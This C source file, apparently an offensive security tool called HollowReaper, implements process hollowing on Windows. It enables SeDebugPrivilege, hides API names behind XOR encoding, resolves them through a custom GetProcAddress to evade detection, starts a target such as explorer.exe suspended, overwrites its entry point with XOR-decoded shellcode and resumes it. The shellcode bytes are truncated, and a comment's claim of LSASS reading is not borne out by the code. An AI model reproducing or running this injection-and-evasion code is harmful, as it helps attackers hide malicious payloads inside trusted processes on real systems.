/*
    Author: vari.sh
    Description:
       - This program implements process hollowing (it creates a suspended process,
         injects a deobfuscated shellcode via XOR, and then resumes the thread).

    Usage: HollowReaper.exe "C:\windows\explorer.exe"

*/

#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

// =====================================================
// API Deobfuscation Functions (XOR)
// =====================================================

// Function to decrypt a string (encrypted data is not null-terminated)
char* xor_decrypt_string(const unsigned char* cipher, size_t len, const char* key, size_t key_len)
{
    char* result = (char*)malloc(len + 1);
    if (!result) return NULL;
    for (size_t i = 0; i < len; i++) {
        result[i] = cipher[i] ^ key[i % key_len];
    }
    result[len] = '\0';
    return result;
}

// Function to decrypt a buffer in-place (e.g., for shellcode)
void xor_decrypt_buffer(unsigned char* buffer, size_t len, const char* key, size_t key_len)
{
    for (size_t i = 0; i < len; i++) {
        buffer[i] ^= key[i % key_len];
    }
}

// 1. "CreateProcessW" (14 characters)
static const unsigned char CPW_ENC[] = {
    0x73, 0x43, 0x57, 0x52, 0x40, 0x50, 0x66, 0x45, 0x57, 0x5A, 0x04, 0x11, 0x10, 0x33
};
// 2. "ReadProcessMemory" (17 characters)
static const unsigned char RPM_ENC[] = {
    0x62, 0x54, 0x53, 0x57, 0x64, 0x47, 0x59, 0x54, 0x5D, 0x4A, 0x12, 0x2F, 0x06, 0x09, 0x0A, 0x14, 0x1E
};
// 3. "WriteProcessMemory" (18 characters)
static const unsigned char WPM_ENC[] = {
    0x67, 0x43, 0x5B, 0x47, 0x51, 0x65, 0x44, 0x58, 0x5B, 0x5C, 0x12, 0x11, 0x2E, 0x01, 0x08, 0x09, 0x15, 0x11
};
// 4. "ResumeThread" (12 characters)
static const unsigned char RT_ENC[] = {
    0x62, 0x54, 0x41, 0x46, 0x59, 0x50, 0x62, 0x5F, 0x4A, 0x5C, 0x00, 0x06
};
// 5. "ZwQueryInformationProcess" (25 characters)
static const unsigned char ZQIP_ENC[] = {
    0x6A, 0x46, 0x63, 0x46, 0x51, 0x47, 0x4F, 0x7E, 0x56, 0x5F, 0x0E, 0x10, 0x0E, 0x05, 0x11,
    0x0F, 0x08, 0x06, 0x39, 0x18, 0x5F, 0x52, 0x57, 0x40, 0x47
};

typedef BOOL(WINAPI* PFN_CPW)(
    LPCWSTR lpApplicationName,
    LPWSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCWSTR lpCurrentDirectory,
    LPSTARTUPINFOW lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
    );

typedef BOOL(WINAPI* PFN_RPM)(
    HANDLE hProcess,
    LPCVOID lpBaseAddress,
    LPVOID lpBuffer,
    SIZE_T nSize,
    SIZE_T* lpNumberOfBytesRead
    );

typedef BOOL(WINAPI* PFN_WPM)(
    HANDLE hProcess,
    LPVOID lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T nSize,
    SIZE_T* lpNumberOfBytesWritten
    );

typedef DWORD(WINAPI* PFN_RT)(HANDLE hThread);

typedef LONG NTSTATUS;
typedef NTSTATUS(WINAPI* PFN_ZQIP)(
    HANDLE ProcessHandle,
    ULONG ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
    );

wchar_t* to_wide(const char* str) {
    int len = MultiByteToWideChar(CP_UTF8, 0, str, -1, NULL, 0);
    if (len == 0) return NULL;
    wchar_t* wstr = (wchar_t*)malloc(len * sizeof(wchar_t));
    if (!wstr) return NULL;
    MultiByteToWideChar(CP_UTF8, 0, str, -1, wstr, len);
    return wstr;
}

// =====================================================
// Function to load clean versions of DLLs
// =====================================================
HMODULE LoadCleanDLL(char* dllPath) {

    HMODULE hDLL = LoadLibraryA(dllPath);
    if (hDLL)
    {
        printf("[+] Loaded clean copy of %s at: %p\n", dllPath, hDLL);
    }
    else
    {
        printf("[ERROR] Failed to load %s. Error: %lu\n", dllPath, GetLastError());
    }

    return hDLL;
}

// =====================================================
// get_proc_address reimplementation
// =====================================================

FARPROC CustomGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
    if (hModule == NULL || lpProcName == NULL) {
        printf("Invalid module handle or function name.\n");
        return NULL;
    }

    // Get the base address of the module
    BYTE* baseAddr = (BYTE*)hModule;

    // Validate the DOS header
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddr;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[!] Invalid DOS signature.\n");
        return NULL;
    }

    // Retrieve the NT headers using the DOS header's e_lfanew field
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(baseAddr + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("[!] Invalid NT signature.\n");
        return NULL;
    }

    // Get the Export Directory from the Data Directory
    IMAGE_DATA_DIRECTORY exportDataDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDataDir.VirtualAddress == 0) {
        printf("[!] No export directory found.\n");
        return NULL;
    }

    // Get a pointer to the Export Directory
    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)(baseAddr + exportDataDir.VirtualAddress);

    // Get pointers to the arrays of function addresses, names and name ordinals
    DWORD* addressOfFunctions = (DWORD*)(baseAddr + exportDir->AddressOfFunctions);
    DWORD* addressOfNames = (DWORD*)(baseAddr + exportDir->AddressOfNames);
    WORD* addressOfNameOrdinals = (WORD*)(baseAddr + exportDir->AddressOfNameOrdinals);

    // Iterate through the exported names to find the desired function
    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        char* functionName = (char*)(baseAddr + addressOfNames[i]);
        if (_stricmp(functionName, lpProcName) == 0) {
            // Retrieve the ordinal for the found function
            WORD ordinal = addressOfNameOrdinals[i];
            // Get the RVA of the function
            DWORD functionRVA = addressOfFunctions[ordinal];
            printf("[+] Found %s at ordinal %hu, RVA: 0x%08X\n", lpProcName, ordinal, functionRVA);
            // Return the absolute address of the function
            return (FARPROC)(baseAddr + functionRVA);
        }
    }

    printf("[!] Function %s not found.\n", lpProcName);
    return NULL;
}


// =====================================================
// Main – Process Hollowing + LSASS EPROCESS Reading
// =====================================================
int main(int argc, char* argv[]) {
    // Start
    printf("[+] Starting HollowReaper\n");

    // Enabling SeDebugPrivilege
    HANDLE hToken = NULL;
    LUID luid;
    TOKEN_PRIVILEGES tp;
    BOOL bResult;

    printf("[*] Requesting SeDebugPrivilege...\n");
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("[!] OpenProcessToken failed, error: %lu\n", GetLastError());
        return 1;
    }
    if (!LookupPrivilegeValue(NULL, L"SeDebugPrivilege", &luid)) {
        printf("[!] LookupPrivilegeValue failed, error: %lu\n", GetLastError());
        return 1;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges->Attributes = SE_PRIVILEGE_ENABLED;
    tp.Privileges->Luid = luid;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL)) {
        printf("[!] AdjustTokenPrivileges failed, error: %lu\n", GetLastError());
        return 1;
    }
    if (GetLastError() != ERROR_SUCCESS) {
        printf("[!] AdjustTokenPrivileges reported an error: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] SeDebugPrivilege enabled.\n");

    // Load clean versions of DLLs
    char* kernel32Path = "C:\\Windows\\System32\\kernel32.dll";
    HANDLE hKernel32 = LoadCleanDLL(kernel32Path);

    char* ntdllPath = "C:\\Windows\\System32\\ntdll.dll";
    HANDLE hNtdll = LoadCleanDLL(ntdllPath);

    const char* XOR_KEY = "0123456789abcdefghij";
    size_t key_len = strlen(XOR_KEY);

    char* strCPW = (char*)malloc(sizeof(CPW_ENC));
    char* strRPM = (char*)malloc(sizeof(RPM_ENC));
    char* strWPM = (char*)malloc(sizeof(WPM_ENC));
    char* strRT = (char*)malloc(sizeof(RT_ENC));
    char* strZQIP = (char*)malloc(sizeof(ZQIP_ENC));
    if (!strCPW || !strRPM || !strWPM || !strRT || !strZQIP) {
        printf("[ERROR] Memory allocation error\n");
        return 1;
    }
    memcpy(strCPW, CPW_ENC, sizeof(CPW_ENC));
    memcpy(strRPM, RPM_ENC, sizeof(RPM_ENC));
    memcpy(strWPM, WPM_ENC, sizeof(WPM_ENC));
    memcpy(strRT, RT_ENC, sizeof(RT_ENC));
    memcpy(strZQIP, ZQIP_ENC, sizeof(ZQIP_ENC));

    // Deobfuscate API names
    strCPW = xor_decrypt_string((unsigned char*)strCPW, sizeof(CPW_ENC), XOR_KEY, key_len);
    strRPM = xor_decrypt_string((unsigned char*)strRPM, sizeof(RPM_ENC), XOR_KEY, key_len);
    strWPM = xor_decrypt_string((unsigned char*)strWPM, sizeof(WPM_ENC), XOR_KEY, key_len);
    strRT = xor_decrypt_string((unsigned char*)strRT, sizeof(RT_ENC), XOR_KEY, key_len);
    strZQIP = xor_decrypt_string((unsigned char*)strZQIP, sizeof(ZQIP_ENC), XOR_KEY, key_len);

    PFN_CPW pCPW = (PFN_CPW)CustomGetProcAddress(hKernel32, strCPW);
    PFN_RPM pRPM = (PFN_RPM)CustomGetProcAddress(hKernel32, strRPM);
    PFN_WPM pWPM = (PFN_WPM)CustomGetProcAddress(hKernel32, strWPM);
    PFN_RT  pRT = (PFN_RT)CustomGetProcAddress(hKernel32, strRT);
    PFN_ZQIP pZQIP = (PFN_ZQIP)CustomGetProcAddress(hNtdll, strZQIP);
    if (!pCPW || !pRPM || !pWPM || !pRT || !pZQIP) {
        printf("[ERROR] Error retrieving API addresses.\n");
        return 1;
    }
    free(strCPW); free(strRPM); free(strWPM); free(strRT); free(strZQIP);

    // Obtain the target executable path (from command line or stdin)
    char exePathA[MAX_PATH] = { 0 };
    if (argc > 1) {
        strncpy(exePathA, argv[1], MAX_PATH - 1);
        printf("[+] Path provided from command line: %s\n", exePathA);
    }
    else {
        printf("[*] Enter the full path of the executable: ");
        if (!fgets(exePathA, sizeof(exePathA), stdin)) {
            printf("[ERROR] Error reading the path.\n");
            return 1;
        }
        exePathA[strcspn(exePathA, "\r\n")] = '\0';
    }
    if (strlen(exePathA) == 0) {
        printf("[ERROR] Invalid path!\n");
        return 1;
    }
    wchar_t* exePathW = to_wide(exePathA);
    if (!exePathW) {
        printf("[ERROR] Error converting the path to Unicode.\n");
        return 1;
    }

    // Create the process in a suspended state

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    if (!pCPW(exePathW, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[ERROR] Error creating the process, code: %lu\n", GetLastError());
        free(exePathW);
        return 1;
    }
    free(exePathW);
    printf("[+] Process created in suspended state, PID: %lu\n", pi.dwProcessId);



    // Retrieve the PEB via ZwQueryInformationProcess
    typedef struct _PROCESS_BASIC_INFORMATION {
        PVOID ExitStatus;
        PVOID PebBaseAddress;
        PVOID AffinityMask;
        PVOID BasePriority;
        ULONG_PTR UniqueProcessId;
        PVOID InheritedFromUniqueProcessId;
    } PROCESS_BASIC_INFORMATION;
    PROCESS_BASIC_INFORMATION pbi;
    ULONG retLen = 0;
    NTSTATUS ntStatus = pZQIP(pi.hProcess, 0, &pbi, sizeof(pbi), &retLen);
    if (ntStatus != 0) {
        printf("[ERROR] ZwQIP failed, NTSTATUS: 0x%lX\n", ntStatus);
        return 1;
    }
    printf("[*] The process's PEB is located at: %p\n", pbi.PebBaseAddress);

    // Read the ImageBaseAddress from the PEB
    LPVOID imageBaseAddress = NULL;
    SIZE_T bytesRead = 0;
    LPCVOID addrImageBase = (LPCVOID)((char*)pbi.PebBaseAddress + 0x10);
    if (!pRPM(pi.hProcess, addrImageBase, &imageBaseAddress, sizeof(imageBaseAddress), &bytesRead)) {
        printf("[ERROR] RPM (ImageBaseAddress) failed, error: %lu\n", GetLastError());
        return 1;
    }
    printf("[*] The Image Base Address is: %p\n", imageBaseAddress);

    // Read the PE header to obtain the EntryPoint
    unsigned char headerBuffer[0x200] = { 0 };
    if (!pRPM(pi.hProcess, imageBaseAddress, headerBuffer, sizeof(headerBuffer), &bytesRead)) {
        printf("[ERROR] RPM (PE header) failed, error: %lu\n", GetLastError());
        return 1;
    }
    DWORD e_lfanew = *(DWORD*)(headerBuffer + 0x3C);
    DWORD entryPointRVA = *(DWORD*)(headerBuffer + e_lfanew + 0x28);
    LPVOID entryPointAddr = (LPVOID)((char*)imageBaseAddress + entryPointRVA);
    printf("[*] The process EntryPoint is: %p\n", entryPointAddr);

    // Prepare and write the shellcode (deobfuscated via XOR) into the EntryPoint
    unsigned char shellcode_enc[] = {
        0xD8, 0xF1, 0xB7, 0x33...
    };
    size_t shellcode_len = sizeof(shellcode_enc);
    // Deobfuscate the shellcode
    xor_decrypt_buffer(shellcode_enc, shellcode_len, XOR_KEY, key_len);
    SIZE_T bytesWritten = 0;
    if (!pWPM(pi.hProcess, entryPointAddr, shellcode_enc, shellcode_len, &bytesWritten)) {
        printf("[ERROR] WPM failed, error: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] Shellcode written at the EntryPoint.\n");

    // Resume the suspended process thread
    DWORD suspendCount = pRT(pi.hThread);
    printf("[+] Thread resumed, suspend count: %lu\n", suspendCount);

    // Cleanup: close handles
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    printf("[+] Operation completed.\n");
    return 0;
}
